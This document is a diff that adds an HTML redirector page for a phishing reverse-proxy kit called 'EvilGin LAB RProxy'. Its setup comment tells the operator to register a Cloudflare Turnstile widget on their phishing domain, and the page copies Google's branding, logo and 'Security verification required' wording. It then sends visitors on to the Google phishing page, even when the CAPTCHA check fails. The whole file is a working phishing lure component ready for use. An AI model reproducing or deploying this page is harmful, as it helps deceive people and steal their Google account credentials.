@@ -1,0 +1,336 @@
+<!--
+    Google Turnstile Redirector for EvilGin LAB RProxy
+    
+    ⚠️ SETUP REQUIRED:
+    1. Create a new Turnstile Site in your Cloudflare dashboard (https://dash.cloudflare.com/?to=/:account/turnstile)
+    2. Set 'Domain' to your phishing domain (e.g., accounts.your-phishing-domain.com)
+    3. Set 'Widget Mode' to 'Invisible' for seamless experience
+    4. Copy the 'Site Key' and replace the placeholder 'YOUR_TURNSTILE_SITE_KEY' below
+    5. Use this redirector by setting: lures edit <id> redirector google_turnstile
+    
+    IMPORTANT: The captcha will NOT work until you replace the site key!
+    
+    HOW IT WORKS:
+    - User visits lure URL (e.g., /LsPqzdYP) → Shows this redirector
+    - After Turnstile verification → Redirects to root path (/) where the actual Google phishing page is served
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security verification required - Google</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Google Sans", Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background: #f8f9fa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #202124;
+        }
+
+        .container {
+            background: white;
+            padding: 48px 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+        }
+
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            margin: 0 auto 32px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 32px;
+            line-height: 24px;
+        }
+
+        .security-info {
+            background: #e8f0fe;
+            border: 1px solid #4285f4;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+            border-radius: 4px;
+        }
+
+        .security-info h2 {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #1967d2;
+        }
+
+        .security-info p {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 20px;
+            margin: 0;
+        }
+
+        .loading-container {
+            margin: 32px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #e8eaed;
+            border-top-color: #4285f4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e8eaed;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        #cf-turnstile {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 16px;
+                padding: 32px 24px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+    
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Google Logo -->
+        <svg class="google-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" preserveAspectRatio="xMidYMid meet">
+            <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+            <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+            <path fill="#FBBC04" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-7.19c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+            <path fill="#4285F4" d="M225 3.34v26.12c0 7.81-3.19 11.84-9.66 11.84-5.98 0-9.66-4.03-9.66-11.84V3.34h-9.33v26.12c0 14.11 8.23 20.84 18.99 20.84s18.99-6.72 18.99-20.84V3.34H225z"/>
+            <path fill="#34A853" d="M262.02 14.11v-10.77h-9.33v10.77c0 4.62-2.35 6.72-5.88 6.72-3.44 0-5.88-2.1-5.88-6.72V3.34h-9.33v10.77c0 9.66 5.21 14.11 15.21 14.11s15.21-4.45 15.21-14.11z"/>
+            <path fill="#EA4335" d="M35.29 41.59V32.23H24.12v9.36c0 5.21 3.19 8.23 7.98 8.23s7.98-3.02 7.98-8.23zm-15.21-9.36h15.21c0-5.21-3.19-8.23-7.98-8.23s-7.23 3.02-7.23 8.23z"/>
+        </svg>
+        
+        <h1>Security verification required</h1>
+        
+        <div class="subtitle">
+            To help protect your account, we need to verify that it's really you trying to sign in.
+        </div>
+        
+        <div class="security-info">
+            <h2>Why am I seeing this?</h2>
+            <p>You're signing in from a new location, device, or browser. This extra security step helps keep your account safe.</p>
+        </div>
+        
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-text">Verifying your request...</div>
+        </div>
+        
+        <noscript>
+            <p style="color: red;">JavaScript is required for security verification.</p>
+        </noscript>
+        
+        <div id="cf-turnstile"></div>
+        
+        <div style="margin-top: 30px;">
+            <a id="manual-redirect-btn" href="#" onclick="performManualRedirect(); return false;" style="display: inline-block; padding: 10px 24px; background: #1a73e8; color: white; text-decoration: none; border-radius: 4px; font-size: 14px;">
+                Continue to Google
+            </a>
+        </div>
+        
+        <div class="footer">
+            <a href="https://policies.google.com/privacy" target="_blank">Privacy</a> • 
+            <a href="https://policies.google.com/terms" target="_blank">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        const DEBUG_MODE = false;
+        const TURNSTILE_SITEKEY = 'YOUR_TURNSTILE_SITE_KEY'; // IMPORTANT: Replace this with your actual Cloudflare Turnstile Site Key
+        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
+        
+        console.log("Redirect URL set to landing page:", REDIRECT_URL);
+        
+        if (DEBUG_MODE) {
+            console.log('Turnstile Redirector Debug Info:');
+            console.log('Site Key:', TURNSTILE_SITEKEY);
+            console.log('Redirect URL:', REDIRECT_URL);
+        }
+        
+        function performRedirect() {
+            console.log('Performing redirect to:', REDIRECT_URL);
+            window.location.href = REDIRECT_URL;
+        }
+        
+        if (typeof turnstile === 'undefined') {
+            console.error('Turnstile failed to load. Redirecting anyway...');
+            document.querySelector('.status-text').textContent = 'Completing verification...';
+            setTimeout(performRedirect, 2000);
+        } else {
+            turnstile.ready(function () {
+                if (DEBUG_MODE) console.log('Turnstile ready, rendering widget...');
+                
+                let verificationTimeout;
+                let verificationCompleted = false;
+                
+                verificationTimeout = setTimeout(function() {
+                    if (!verificationCompleted) {
+                        console.warn('Turnstile verification timeout - redirecting anyway');
+                        document.querySelector('.status-text').textContent = 'Completing verification...';
+                        setTimeout(function() {
+                            window.location.href = REDIRECT_URL;
+                        }, 500);
+                    }
+                }, 5000);
+                
+                try {
+                    const widgetId = turnstile.render('#cf-turnstile', {
+                        sitekey: TURNSTILE_SITEKEY,
+                        callback: function(token) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            
+                            if (DEBUG_MODE) console.log('Turnstile verification successful');
+                            
+                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                            
+                            setTimeout(function() {
+                                window.location.href = REDIRECT_URL;
+                            }, 800);
+                        },
+                        'error-callback': function(error) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            
+                            console.error('Turnstile error:', error);
+                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
+                            
+                            setTimeout(function() {
+                                window.location.href = REDIRECT_URL;
+                            }, 1000);
+                        },
+                        'expired-callback': function() {
+                            if (DEBUG_MODE) console.log('Turnstile token expired');
+                            document.querySelector('.status-text').textContent = 'Verification expired. Refreshing...';
+                            location.reload();
+                        },
+                        'timeout-callback': function() {
+                            console.warn('Turnstile timeout');
+                            document.querySelector('.status-text').textContent = 'Verification timeout. Redirecting...';
+                            setTimeout(function() {
+                                window.location.href = REDIRECT_URL;
+                            }, 1000);
+                        }
+                    });
+                    
+                    if (DEBUG_MODE) console.log('Turnstile widget ID:', widgetId);
+                    
+                } catch (e) {
+                    clearTimeout(verificationTimeout);
+                    console.error('Failed to render Turnstile:', e);
+                    document.querySelector('.status-text').textContent = 'Bypassing verification...';
+                    
+                    setTimeout(function() {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                }
+            });
+        }
+        
+        function performManualRedirect() {
+            if (REDIRECT_URL) {
+                console.log('Manual redirect to:', REDIRECT_URL);
+                window.location.href = REDIRECT_URL;
+            } else {
+                alert('Redirect URL not available. Please refresh the page.');
+            }
+        }
+        
+        setTimeout(function() {
+            if (REDIRECT_URL) {
+                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                
+                var btn = document.getElementById('manual-redirect-btn');
+                if (btn) btn.href = REDIRECT_URL;
+                
+                try {
+                    window.location.href = REDIRECT_URL;
+                } catch (e) {
+                    console.error('Redirect failed:', e);
+                    window.location = REDIRECT_URL;
+                }
+            }
+        }, 3000);
+        
+        if (REDIRECT_URL) {
+            setTimeout(function() {
+                var btn = document.getElementById('manual-redirect-btn');
+                if (btn) {
+                    btn.href = REDIRECT_URL;
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
+
